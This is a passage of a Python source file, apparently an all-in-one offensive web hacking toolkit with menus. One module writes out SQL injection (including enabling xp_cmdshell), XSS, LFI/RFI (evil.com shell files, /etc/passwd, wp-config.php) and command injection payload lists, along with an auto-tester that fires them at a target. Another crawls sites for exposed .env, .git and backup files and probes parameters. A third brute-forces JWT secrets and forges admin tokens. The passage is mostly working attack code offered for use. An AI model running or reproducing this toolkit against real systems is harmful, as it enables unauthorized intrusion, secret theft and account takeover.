            "%2527%2520OR%25201%253D1--", "%2527%2520OR%2520%25271%2527%253D%25271",
            "%2527%2520AND%25201%253D1--",
            
            # Unicode Bypass
            "´ OR 1=1--", "` OR 1=1--", "‘ OR 1=1--", "’ OR 1=1--",
            "¨ OR 1=1--", "ˆ OR 1=1--",
            
            # Error Based
            "' AND extractvalue(1,concat(0x7e,database()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
            "' AND (select * from(select sleep(5))a)--",
            "' AND benchmark(10000000,md5(1))--",
            
            # Union Based
            "' UNION SELECT null,null,null--",
            "' UNION SELECT database(),user(),version()--",
            "' UNION SELECT group_concat(table_name),null,null FROM information_schema.tables--",
            
            # Stacked Queries (MSSQL)
            "'; EXEC xp_cmdshell('id')--",
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--",
            "'; WAITFOR DELAY '0:0:5'--",
            
            # NoSQL Injection
            "{'$ne': ''}", "{'$gt': ''}", "{'$regex': '.*'}", "{$ne: null}",
            "username[$ne]=admin", "password[$regex]=^.*$",
            
            # Advanced Bypass
            "'+or+1=1--", "'||1=1--", "'/**/or/**/1=1--", "'%20or%201=1--",
            "'+and+1=1--", "'||'1'='1", "'%20and%20'1'='1",
        ]
        
        # ============================================================
        # XSS BYPASS PAYLOADS (150+)
        # ============================================================
        
        xss_payloads = [
            # Basic
            "<script>alert(1)</script>", "<ScRiPt>alert(1)</ScRiPt>", "<SCRIPT>alert(1)</SCRIPT>",
            "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>", "<a href=javascript:alert(1)>click</a>",
            
            # Event Handlers
            "<div onmouseover=alert(1)>hover</div>", "<div onclick=alert(1)>click</div>",
            "<input onfocus=alert(1) autofocus>", "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>", "<video onload=alert(1)><source>", "<audio onload=alert(1)><source>",
            
            # Encoded
            "%3Cscript%3Ealert(1)%3C/script%3E", "%253Cscript%253Ealert(1)%253C/script%253E",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
            
            # Filter Bypass
            "<scr<script>ipt>alert(1)</scr</script>ipt>", "<script//>alert(1)</script>",
            "<script/src=//x.com/x.js>", "<script>alert(1)//</script>", "<<script>alert(1)</script>",
            "<scscriptript>alert(1)</scscriptript>",
            
            # Polyglot
            "javascript:alert(1)//", "javascript:alert(1)#", "javascript://%0Aalert(1)",
            "';alert(1);//", "\";alert(1);//", "`;alert(1);//",
            
            # DOM Based
            "#<script>alert(1)</script>", "javascript:alert(document.domain)#", "javascript:alert(document.cookie)#",
            
            # Attribute Injection
            "' onmouseover='alert(1)'", "\" onmouseover=\"alert(1)\"", "' onclick='alert(1)'",
            "\" onclick=\"alert(1)\"", "` onmouseover=`alert(1)`",
        ]
        
        # ============================================================
        # LFI/RFI BYPASS PAYLOADS (100+)
        # ============================================================
        
        lfi_payloads = [
            # Basic
            "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
            "....//....//....//etc/passwd", "../../../../../../../../etc/passwd",
            
            # Encoded
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%252f..%252f..%252fetc/passwd", "..%c0%af..%c0%af..%c0%afetc/passwd", "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
            
            # Null Byte
            "../../../etc/passwd%00", "../../../etc/passwd%00.jpg", "../../../etc/passwd%00.png", "../../../etc/passwd%00.gif",
            
            # Wrapper
            "php://filter/convert.base64-encode/resource=index.php", "php://filter/read=convert.base64-encode/resource=config.php",
            "php://filter/convert.base64-encode/resource=wp-config.php", "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
            
            # Windows
            "..\\..\\..\\windows\\win.ini", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\win.ini", "C:\\xampp\\htdocs\\config.php",
            
            # Remote File Inclusion
            "http://evil.com/shell.txt", "https://evil.com/shell.php", "http://127.0.0.1/shell.txt",
            "//evil.com/shell.txt", "\\\\evil.com\\shell.txt",
        ]
        
        # ============================================================
        # RCE BYPASS PAYLOADS (100+)
        # ============================================================
        
        rce_payloads = [
            # Basic Linux
            ";id", "|id", "||id", "&id", "&&id", "`id`", "$(id)", "%0aid", "%0a%0aid",
            "; ls -la", "| cat /etc/passwd",
            
            # Bypass Space
            ";${IFS}id", "|${IFS}id", ";{id,}", "|{id,}", ";id%09", "|id%09",
            
            # Bypass Slash
            "cat${IFS}etc/passwd", "cat${IFS}etc${IFS}passwd", "cat$IFS$9etc/passwd",
            "cat${IFS}${PWD:0:1}etc${PWD:0:1}passwd",
            
            # Windows
            ";dir", "|dir", "&dir", "&&dir", "| type C:\\windows\\win.ini", "; type C:\\windows\\win.ini",
            
            # Encoded
            "%3Bid", "%7Cid", "%26id", "%3B%20ls", "%7C%20ls",
            
            # Advanced
            "a=id;$a", "c=id;$c", "eval('id')", "system('id')", "exec('id')", "shell_exec('id')", "popen('id','r')",
        ]
        
        # ============================================================
        # CHUNKED TRANSFER ENCODING BYPASS
        # ============================================================
        
        chunked_payloads = [
            "6\r\n<script\r\n0\r\n\r\n",
            "10\r\n<script>alert(1)</script>\r\n0\r\n\r\n",
            "8\r\n' OR 1=1\r\n0\r\n\r\n",
            "12\r\n../../../etc/passwd\r\n0\r\n\r\n",
        ]
        
        # ============================================================
        # PARAMETER POLLUTION
        # ============================================================
        
        pollution_payloads = [
            "id=1&id=2&id=3",
            "page=index&page=admin",
            "user=admin&user=guest",
            "param=1&param=../../etc/passwd",
            "q=1&q=' OR 1=1--",
        ]
        
        # ============================================================
        # SAVE ALL PAYLOADS
        # ============================================================
        
        with open(f"{folder_name}/sqli_bypass.txt", 'w') as f:
            f.write("="*70 + "\n")
            f.write("SQL INJECTION BYPASS PAYLOADS\n")
            f.write("="*70 + "\n\n")
            for p in sqli_payloads:
                f.write(p + "\n")
        
        with open(f"{folder_name}/xss_bypass.txt", 'w') as f:
            f.write("="*70 + "\n")
            f.write("XSS BYPASS PAYLOADS\n")
            f.write("="*70 + "\n\n")
            for p in xss_payloads:
                f.write(p + "\n")
        
        with open(f"{folder_name}/lfi_bypass.txt", 'w') as f:
            f.write("="*70 + "\n")
            f.write("LFI/RFI BYPASS PAYLOADS\n")
            f.write("="*70 + "\n\n")
            for p in lfi_payloads:
                f.write(p + "\n")
        
        with open(f"{folder_name}/rce_bypass.txt", 'w') as f:
            f.write("="*70 + "\n")
            f.write("RCE BYPASS PAYLOADS\n")
            f.write("="*70 + "\n\n")
            for p in rce_payloads:
                f.write(p + "\n")
        
        with open(f"{folder_name}/chunked_bypass.txt", 'w') as f:
            f.write("="*70 + "\n")
            f.write("CHUNKED TRANSFER BYPASS\n")
            f.write("="*70 + "\n\n")
            for p in chunked_payloads:
                f.write(p + "\n")
        
        with open(f"{folder_name}/parameter_pollution.txt", 'w') as f:
            f.write("="*70 + "\n")
            f.write("PARAMETER POLLUTION\n")
            f.write("="*70 + "\n\n")
            for p in pollution_payloads:
                f.write(p + "\n")
        
        # ============================================================
        # GENERATE TEST SCRIPT
        # ============================================================
        
        test_script = f'''#!/usr/bin/env python3
# WAF BYPASS TESTER
import requests
import sys
import time

target = "{target_url}" if "{target_url}" else input("Target URL: ")

payloads = {{
    "SQLi": {sqli_payloads[:20]},
    "XSS": {xss_payloads[:20]},
    "LFI": {lfi_payloads[:20]},
    "RCE": {rce_payloads[:20]}
}}

headers = {{
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'X-Forwarded-For': '127.0.0.1',
    'Client-IP': '127.0.0.1'
}}

for vuln_type, payload_list in payloads.items():
    print(f"\\n[+] Testing {{vuln_type}} payloads...")
    for payload in payload_list:
        try:
            r = requests.get(f"{{target}}?q={{payload}}", headers=headers, timeout=5)
            if r.status_code == 200:
                print(f"    Possible Bypass: {{payload[:50]}}")
        except:
            pass
        time.sleep(0.1)
'''
        
        with open(f"{folder_name}/waf_tester.py", 'w') as f:
            f.write(test_script)
        
        # ============================================================
        # SUMMARY
        # ============================================================
        
        print(f"""
{GREEN}{BOLD}[✓] WAF BYPASS KIT GENERATED SUCCESSFULLY!{RESET}
{RED}{BOLD}================================================================================{RESET}
{CYAN}{BOLD}[!] FILES SAVED IN:{RESET}
{RED}{BOLD}    {folder_name}{RESET}
{CYAN}{BOLD}[!] PAYLOAD FILES:{RESET}
{GREEN}    ├─ sqli_bypass.txt ({len(sqli_payloads)} payloads){RESET}
{GREEN}    ├─ xss_bypass.txt ({len(xss_payloads)} payloads){RESET}
{GREEN}    ├─ lfi_bypass.txt ({len(lfi_payloads)} payloads){RESET}
{GREEN}    ├─ rce_bypass.txt ({len(rce_payloads)} payloads){RESET}
{GREEN}    ├─ chunked_bypass.txt ({len(chunked_payloads)} payloads){RESET}
{GREEN}    ├─ parameter_pollution.txt ({len(pollution_payloads)} payloads){RESET}
{GREEN}    └─ waf_tester.py (auto tester){RESET}
{RED}{BOLD}================================================================================{RESET}
{YELLOW}{BOLD}[!] HOW TO USE:{RESET}
{YELLOW}1. USE PAYLOADS FROM TXT FILES AGAINST TARGET{RESET}
{YELLOW}2. RUN: python3 waf_tester.py{RESET}
{YELLOW}3. TRY CHUNKED TRANSFER ENCODING FOR WAF BYPASS{RESET}
{YELLOW}4. COMBINE MULTIPLE TECHNIQUES FOR BEST RESULT{RESET}
{RED}{BOLD}================================================================================{RESET}
        """)
        
        self.scan_results.append({
            'module': 'WAF BYPASS KIT',
            'target': target_url if target_url else 'No target',
            'folder': folder_name,
            'payloads': len(sqli_payloads) + len(xss_payloads) + len(lfi_payloads) + len(rce_payloads),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] PRESS ENTER TO CONTINUE...{RESET}")
        # ================================================================
# MENU 42: CRAWLER + PARAMETER EXTRACTOR (WITH CUSTOM FOLDER)
# ================================================================
    def menu_crawler_extractor(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}================================================================================{RESET}")
        print(f"{GREEN}{BOLD}🕷️ MENU 36: CRAWLER + PARAMETER EXTRACTOR 🕷️{RESET}")
        print(f"{RED}{BOLD}================================================================================{RESET}\n")
        
        print(f"""
{YELLOW}{BOLD}[!] FITUR CRAWLER + EXTRACTOR:{RESET}
{CYAN}--------------------------------------------------------------------------------{RESET}
{CYAN}[+] CRAWL ALL URLS FROM WEBSITE (INTERNAL + EXTERNAL){RESET}
{CYAN}[+] EXTRACT ALL PARAMETERS (id, q, page, file, etc){RESET}
{CYAN}[+] DETECT FORMS (GET/POST){RESET}
{CYAN}[+] FIND API ENDPOINTS{RESET}
{CYAN}[+] FIND HIDDEN FILES (robots.txt, sitemap.xml, .git){RESET}
{CYAN}[+] AUTO TEST PARAMETERS FOR VULNERABILITY{RESET}
{CYAN}[+] SAVE ALL RESULTS TO CUSTOM FOLDER{RESET}
{CYAN}--------------------------------------------------------------------------------{RESET}
        """)
        
        # Minta folder dari user
        save_folder = input(f"{CYAN}{BOLD}[?] FOLDER PATH TO SAVE RESULTS (contoh: /storage/emulated/0/crawl_results/): {RESET}")
        
        if not save_folder.endswith('/'):
            save_folder += '/'
        
        if not os.path.exists(save_folder):
            os.makedirs(save_folder)
            print(f"{GREEN}[+] FOLDER CREATED: {save_folder}{RESET}")
        else:
            print(f"{GREEN}[+] USING EXISTING FOLDER: {save_folder}{RESET}")
        
        target_url = input(f"{CYAN}{BOLD}[?] TARGET URL (https://target.com): {RESET}")
        
        if not target_url.startswith('http'):
            target_url = 'https://' + target_url
        
        depth = input(f"{CYAN}{BOLD}[?] CRAWL DEPTH (1-5, default 2): {RESET}")
        if not depth:
            depth = 2
        else:
            depth = int(depth)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        folder_name = os.path.join(save_folder, f"crawl_{target_url.replace('https://','').replace('http://','').replace('/','_')}_{timestamp}")
        os.makedirs(folder_name, exist_ok=True)
        
        print(f"\n{CYAN}{BOLD}[*] CRAWLING {target_url} WITH DEPTH {depth}...{RESET}\n")
        print(f"{YELLOW}[!] RESULTS WILL BE SAVED TO: {folder_name}{RESET}\n")
        
        visited_urls = set()
        all_parameters = set()
        all_forms = []
        api_endpoints = []
        hidden_files = []
        external_urls = set()
        vulnerable_params = []
        
        # Hidden paths to check
        hidden_paths = [
            '/robots.txt', '/sitemap.xml', '/sitemap_index.xml',
            '/.git/config', '/.env', '/.htaccess', '/wp-config.php.bak',
            '/config.php.bak', '/backup.zip', '/admin/backup.sql',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/.git/HEAD', '/.git/index', '/.env.backup', '/.env.bak',
            '/config.json', '/settings.py', '/database.yml', '/application.properties'
        ]
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        def clean_url(url):
            url = url.split('#')[0]
            url = url.split('?')[0] if '?' in url else url
            return url.rstrip('/')
        
        def extract_params_from_url(url):
            params = set()
            if '?' in url:
                query = url.split('?')[1]
                for param in query.split('&'):
                    if '=' in param:
                        param_name = param.split('=')[0]
                        params.add(param_name)
            return params
        
        def get_links_from_page(url, base_domain, current_depth):
            if current_depth > depth:
                return []
            
            if url in visited_urls:
                return []
            
            visited_urls.add(url)
            
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                r = requests.get(url, headers=headers, timeout=10)
                
                if r.status_code != 200:
                    return []
                
                soup = BeautifulSoup(r.text, 'html.parser')
                links = []
                
                # Extract all href links
                for a in soup.find_all('a', href=True):
                    href = a['href']
                    full_url = urljoin(url, href)
                    
                    # Extract parameters from URL
                    params = extract_params_from_url(full_url)
                    for p in params:
                        all_parameters.add(p)
                    
                    # Check if internal link
                    if base_domain in full_url or full_url.startswith('/'):
                        if full_url not in visited_urls:
                            links.append(full_url)
                            print(f"{GREEN}[+] FOUND: {full_url[:100]}{RESET}")
                    elif full_url.startswith('http'):
                        external_urls.add(full_url)
                
                # Extract forms
                for form in soup.find_all('form'):
                    form_data = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'GET'),
                        'inputs': []
                    }
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        inp_name = inp.get('name')
                        if inp_name:
                            form_data['inputs'].append(inp_name)
                            all_parameters.add(inp_name)
                    all_forms.append(form_data)
                    print(f"{YELLOW}[!] FORM FOUND: {form_data['method']} {form_data['action']}{RESET}")
                
                # Extract API endpoints
                api_patterns = [
                    r'["\'](/api/[^"\']+)["\']',
                    r'["\'](/v\d/[^"\']+)["\']',
                    r'["\'](/rest/[^"\']+)["\']',
                    r'["\'](/graphql)["\']',
                    r'["\'](/swagger[^"\']*)["\']',
                    r'["\'](/docs[^"\']*)["\']',
                    r'["\'](/v1[^"\']*)["\']',
                    r'["\'](/v2[^"\']*)["\']',
                    r'["\'](/v3[^"\']*)["\']'
                ]
                
                for pattern in api_patterns:
                    matches = re.findall(pattern, r.text, re.IGNORECASE)
                    for match in matches:
                        full_api = urljoin(url, match)
                        if full_api not in api_endpoints:
                            api_endpoints.append(full_api)
                            print(f"{BLUE}[API] {full_api}{RESET}")
                
                return links
                
            except Exception as e:
                print(f"{RED}[-] ERROR: {e}{RESET}")
                return []
        
        # Parse base domain
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        base_domain = parsed.netloc
        
        # Start crawling
        queue = [(target_url, 0)]
        i = 0
        
        print(f"{CYAN}[*] STARTING CRAWL...{RESET}\n")
        
        while queue and i < 500:
            current_url, current_depth = queue.pop(0)
            new_links = get_links_from_page(current_url, base_domain, current_depth)
            for link in new_links:
                if link not in visited_urls:
                    queue.append((link, current_depth + 1))
            i += 1
        
        # Check hidden files
        print(f"\n{CYAN}{BOLD}[*] CHECKING HIDDEN FILES...{RESET}")
        for path in hidden_paths:
            test_url = urljoin(target_url, path)
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                r = requests.get(test_url, headers=headers, timeout=5)
                if r.status_code == 200:
                    hidden_files.append(test_url)
                    print(f"{RED}[!] HIDDEN FILE FOUND: {test_url}{RESET}")
            except:
                pass
        
        # Test parameters for vulnerability
        print(f"\n{CYAN}{BOLD}[*] TESTING {len(all_parameters)} PARAMETERS FOR VULNERABILITY...{RESET}")
        
        test_payloads = {
            'SQLi': ["' OR '1'='1", "' AND 1=1--", "' OR SLEEP(5)--", "' UNION SELECT NULL--", "1' AND '1'='1"],
            'XSS': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
            'LFI': ["../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd"],
            'RCE': [";id", "|id", "||id", "&id", "`id`", "$(id)"]
        }
        
        for param in list(all_parameters)[:50]:
            for vuln_type, payloads in test_payloads.items():
                for payload in payloads:
                    test_url = f"{target_url}?{param}={payload}"
                    try:
                        r = requests.get(test_url, timeout=5)
                        if vuln_type == 'SQLi' and ('mysql' in r.text.lower() or 'sql' in r.text.lower() or 'syntax' in r.text.lower()):
                            vulnerable_params.append({'param': param, 'type': vuln_type, 'url': test_url})
                            print(f"{RED}[!] {vuln_type} VULN: {param}{RESET}")
                            break
                        elif vuln_type == 'XSS' and payload in r.text:
                            vulnerable_params.append({'param': param, 'type': vuln_type, 'url': test_url})
                            print(f"{RED}[!] {vuln_type} VULN: {param}{RESET}")
                            break
                        elif vuln_type == 'LFI' and ('root:' in r.text or 'bin/bash' in r.text):
                            vulnerable_params.append({'param': param, 'type': vuln_type, 'url': test_url})
                            print(f"{RED}[!] {vuln_type} VULN: {param}{RESET}")
                            break
                        elif vuln_type == 'RCE' and ('uid=' in r.text or 'gid=' in r.text):
                            vulnerable_params.append({'param': param, 'type': vuln_type, 'url': test_url})
                            print(f"{RED}[!] {vuln_type} VULN: {param}{RESET}")
                            break
                    except:
                        pass
        
        # Save results
        urls_file = os.path.join(folder_name, "all_urls.txt")
        with open(urls_file, 'w') as f:
            f.write(f"# CRAWL RESULTS FOR {target_url}\n")
            f.write(f"# DATE: {datetime.datetime.now()}\n")
            f.write(f"# TOTAL URLS: {len(visited_urls)}\n\n")
            for url in sorted(visited_urls):
                f.write(url + '\n')
        
        params_file = os.path.join(folder_name, "parameters.txt")
        with open(params_file, 'w') as f:
            f.write(f"# PARAMETERS FOUND\n")
            f.write(f"# TOTAL: {len(all_parameters)}\n\n")
            for param in sorted(all_parameters):
                f.write(param + '\n')
        
        api_file = os.path.join(folder_name, "api_endpoints.txt")
        with open(api_file, 'w') as f:
            f.write(f"# API ENDPOINTS FOUND\n")
            f.write(f"# TOTAL: {len(api_endpoints)}\n\n")
            for api in api_endpoints:
                f.write(api + '\n')
        
        hidden_file = os.path.join(folder_name, "hidden_files.txt")
        with open(hidden_file, 'w') as f:
            f.write(f"# HIDDEN FILES FOUND\n")
            f.write(f"# TOTAL: {len(hidden_files)}\n\n")
            for hf in hidden_files:
                f.write(hf + '\n')
        
        vuln_file = os.path.join(folder_name, "vulnerable_params.txt")
        with open(vuln_file, 'w') as f:
            f.write(f"# VULNERABLE PARAMETERS\n")
            f.write(f"# TOTAL: {len(vulnerable_params)}\n\n")
            for vuln in vulnerable_params:
                f.write(f"[{vuln['type']}] {vuln['param']}\n")
                f.write(f"URL: {vuln['url']}\n\n")
        
        external_file = os.path.join(folder_name, "external_urls.txt")
        with open(external_file, 'w') as f:
            f.write(f"# EXTERNAL URLS FOUND\n")
            f.write(f"# TOTAL: {len(external_urls)}\n\n")
            for ext in sorted(external_urls):
                f.write(ext + '\n')
        
        forms_file = os.path.join(folder_name, "forms.txt")
        with open(forms_file, 'w') as f:
            f.write(f"# FORMS FOUND\n")
            f.write(f"# TOTAL: {len(all_forms)}\n\n")
            for form in all_forms:
                f.write(f"Method: {form['method']}\n")
                f.write(f"Action: {form['action']}\n")
                f.write(f"Inputs: {', '.join(form['inputs'])}\n")
                f.write("-" * 50 + "\n")
        
        print(f"""
{GREEN}{BOLD}[✓] CRAWLING COMPLETED!{RESET}
{RED}{BOLD}================================================================================{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {target_url}{RESET}
{CYAN}├─ CRAWL DEPTH        : {depth}{RESET}
{CYAN}├─ TOTAL URLS FOUND   : {len(visited_urls)}{RESET}
{CYAN}├─ TOTAL PARAMETERS    : {len(all_parameters)}{RESET}
{CYAN}├─ API ENDPOINTS       : {len(api_endpoints)}{RESET}
{CYAN}├─ HIDDEN FILES        : {len(hidden_files)}{RESET}
{CYAN}├─ EXTERNAL URLS       : {len(external_urls)}{RESET}
{CYAN}├─ FORMS FOUND         : {len(all_forms)}{RESET}
{CYAN}└─ VULNERABLE PARAMS   : {len(vulnerable_params)}{RESET}
{RED}{BOLD}================================================================================{RESET}
{CYAN}{BOLD}[!] RESULTS SAVED IN:{RESET}
{RED}{BOLD}    {folder_name}{RESET}
{CYAN}{BOLD}[!] FILES:{RESET}
{GREEN}    ├─ all_urls.txt{RESET}
{GREEN}    ├─ parameters.txt{RESET}
{GREEN}    ├─ api_endpoints.txt{RESET}
{GREEN}    ├─ hidden_files.txt{RESET}
{GREEN}    ├─ vulnerable_params.txt{RESET}
{GREEN}    ├─ external_urls.txt{RESET}
{GREEN}    └─ forms.txt{RESET}
{RED}{BOLD}================================================================================{RESET}
        """)
        
        if vulnerable_params:
            print(f"{RED}{BOLD}[!] VULNERABLE PARAMETERS FOUND! CAN BE EXPLOITED!{RESET}")
            print(f"{YELLOW}[!] CHECK {vuln_file} FOR DETAILS{RESET}")
        
        self.scan_results.append({
            'module': 'CRAWLER EXTRACTOR',
            'target': target_url,
            'urls': len(visited_urls),
            'params': len(all_parameters),
            'vulnerable': len(vulnerable_params),
            'folder': folder_name,
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] PRESS ENTER TO CONTINUE...{RESET}")
        # ================================================================
# MENU 47: JWT TOKEN CRACKER + FORGER
# ================================================================
    def menu_jwt_cracker(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}================================================================================{RESET}")
        print(f"{GREEN}{BOLD}🔐 MENU 37: JWT TOKEN CRACKER + FORGER (BRUTAL EDITION) 🔐{RESET}")
        print(f"{RED}{BOLD}================================================================================{RESET}\n")
        
        print(f"""
{RED}{BOLD}[!] FITUR JWT TOKEN CRACKER + FORGER:{RESET}
{CYAN}--------------------------------------------------------------------------------{RESET}
{CYAN}[+] CRACK JWT SECRET KEY (BRUTEFORCE){RESET}
{CYAN}[+] DECODE JWT TOKEN (HEADER + PAYLOAD){RESET}
{CYAN}[+] FORGE FAKE JWT TOKEN (ADMIN ACCESS){RESET}
{CYAN}[+] SUPPORT HS256, HS384, HS512 ALGORITHMS{RESET}
{CYAN}[+] WORDLIST ATTACK + SMART BRUTEFORCE{RESET}
{CYAN}[+] AUTO VERIFY FORGED TOKEN{RESET}
{CYAN}[+] SAVE ALL RESULTS TO FILE{RESET}
{CYAN}--------------------------------------------------------------------------------{RESET}
        """)
        
        # Minta folder
        save_folder = input(f"{CYAN}{BOLD}[?] FOLDER PATH (contoh: /storage/emulated/0/JWT_CRACK/): {RESET}")
        if not save_folder.endswith('/'):
            save_folder += '/'
        os.makedirs(save_folder, exist_ok=True)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        folder_name = os.path.join(save_folder, f"JWT_CRACKER_{timestamp}")
        os.makedirs(folder_name, exist_ok=True)
        
        print(f"""
{YELLOW}{BOLD}[!] SELECT MODE:{RESET}
{GREEN}[1]{RESET} DECODE JWT TOKEN (View Header + Payload)
{GREEN}[2]{RESET} CRACK JWT SECRET KEY (Bruteforce)
{GREEN}[3]{RESET} FORGE JWT TOKEN (Create Fake Token)
{GREEN}[4]{RESET} FULL AUTO (Decode + Crack + Forge)
        """)
        
        mode = input(f"{YELLOW}{BOLD}[?] CHOOSE (1-4): {RESET}")
        
        if mode == '1':
            # MODE DECODE
            jwt_token = input(f"{CYAN}{BOLD}[?] JWT TOKEN: {RESET}")
            
            print(f"\n{CYAN}{BOLD}[*] DECODING JWT TOKEN...{RESET}\n")
            
            try:
                import base64
                import json
                
                parts = jwt_token.split('.')
                if len(parts) != 3:
                    print(f"{RED}[!] INVALID JWT FORMAT!{RESET}")
                    input(f"\n{CYAN}[?] PRESS ENTER...{RESET}")
                    return
                
                # Decode header
                header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
                header_json = base64.b64decode(header_padded).decode('utf-8')
                header = json.loads(header_json)
                
                # Decode payload
                payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
                payload_json = base64.b64decode(payload_padded).decode('utf-8')
                payload = json.loads(payload_json)
                
                print(f"{GREEN}{BOLD}[✓] JWT DECODED SUCCESSFULLY!{RESET}")
                print(f"{RED}{BOLD}================================================================================{RESET}")
                print(f"{CYAN}{BOLD}[HEADER]:{RESET}")
                print(f"{WHITE}{json.dumps(header, indent=2)}{RESET}")
                print(f"\n{CYAN}{BOLD}[PAYLOAD]:{RESET}")
                print(f"{WHITE}{json.dumps(payload, indent=2)}{RESET}")
                print(f"\n{CYAN}{BOLD}[SIGNATURE]:{RESET}")
                print(f"{WHITE}{parts[2]}{RESET}")
                
                # Save result
                with open(f"{folder_name}/decoded_token.txt", 'w') as f:
                    f.write(f"HEADER:\n{json.dumps(header, indent=2)}\n\n")
                    f.write(f"PAYLOAD:\n{json.dumps(payload, indent=2)}\n\n")
                    f.write(f"SIGNATURE:\n{parts[2]}\n")
                
                print(f"\n{GREEN}[+] RESULT SAVED: {folder_name}/decoded_token.txt{RESET}")
                
            except Exception as e:
                print(f"{RED}[!] ERROR: {e}{RESET}")
        
        elif mode == '2':
            # MODE CRACK JWT SECRET
            jwt_token = input(f"{CYAN}{BOLD}[?] JWT TOKEN: {RESET}")
            wordlist_path = input(f"{CYAN}{BOLD}[?] WORDLIST PATH (default: rockyou.txt): {RESET}")
            if not wordlist_path:
                wordlist_path = "/usr/share/wordlists/rockyou.txt"
            
            print(f"\n{CYAN}{BOLD}[*] CRACKING JWT SECRET KEY...{RESET}\n")
            
            # Common weak secrets
            common_secrets = [
                'secret', 'secretkey', 'jwtsecret', 'mysecret', 'supersecret',
                '123456', 'password', 'admin', 'root', 'key', 'jwt', 'token',
                'changeme', 'default', 'test', 'test123', 'qwerty', 'abc123'
            ]
            
            cracked = False
            
            # Try common secrets first
            print(f"{YELLOW}[*] TRYING COMMON SECRETS...{RESET}")
            for secret in common_secrets:
                try:
                    import jwt
                    decoded = jwt.decode(jwt_token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                    print(f"{RED}{BOLD}[!] SECRET FOUND!{RESET}")
                    print(f"{GREEN}    SECRET KEY: {secret}{RESET}")
                    print(f"{GREEN}    DECODED: {decoded}{RESET}")
                    
                    with open(f"{folder_name}/cracked_secret.txt", 'w') as f:
                        f.write(f"TOKEN: {jwt_token}\n")
                        f.write(f"SECRET: {secret}\n")
                        f.write(f"DECODED: {decoded}\n")
                    
                    cracked = True
                    break
                except:
                    pass
            
            if not cracked:
                # Try wordlist
                print(f"{YELLOW}[*] TRYING WORDLIST...{RESET}")
                try:
                    with open(wordlist_path, 'r', errors='ignore') as f:
                        for i, secret in enumerate(f):
                            secret = secret.strip()
                            if i % 1000 == 0:
                                print(f"{YELLOW}[*] TESTED {i} PASSWORDS...{RESET}")
                            try:
                                import jwt
                                decoded = jwt.decode(jwt_token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                                print(f"{RED}{BOLD}[!] SECRET FOUND!{RESET}")
                                print(f"{GREEN}    SECRET KEY: {secret}{RESET}")
                                print(f"{GREEN}    DECODED: {decoded}{RESET}")
                                
                                with open(f"{folder_name}/cracked_secret.txt", 'w') as f:
                                    f.write(f"TOKEN: {jwt_token}\n")
                                    f.write(f"SECRET: {secret}\n")
                                    f.write(f"DECODED: {decoded}\n")
                                
                                cracked = True
                                break
                            except:
                                pass
                except FileNotFoundError:
                    print(f"{RED}[!] WORDLIST NOT FOUND!{RESET}")
            
            if not cracked:
                print(f"{RED}[!] SECRET NOT FOUND!{RESET}")
        
        elif mode == '3':
            # MODE FORGE JWT TOKEN
            print(f"""
{YELLOW}{BOLD}[!] FORGE JWT TOKEN - CREATE FAKE TOKEN{RESET}
{CYAN}--------------------------------------------------------------------------------{RESET}
{YELLOW}[!] YOU NEED THE SECRET KEY TO FORGE TOKEN{RESET}
{YELLOW}[!] IF YOU DON'T HAVE IT, CRACK IT FIRST (OPTION 2){RESET}
            """)
            
            secret_key = input(f"{CYAN}{BOLD}[?] SECRET KEY: {RESET}")
            
            print(f"""
{YELLOW}{BOLD}[!] CUSTOMIZE PAYLOAD:{RESET}
{GREEN}[1]{RESET} Make Admin Token
{GREEN}[2]{RESET} Custom Payload
            """)
            
            forge_choice = input(f"{YELLOW}{BOLD}[?] CHOOSE (1-2): {RESET}")
            
            try:
                import jwt
                
                if forge_choice == '1':
                    # Admin token
                    payload = {
                        'sub': 'admin',
                        'role': 'admin',
                        'is_admin': True,
                        'user_id': 1,
                        'username': 'administrator',
                        'email': 'admin@target.com',
                        'exp': int(time.time()) + 86400  # 24 hours
                    }
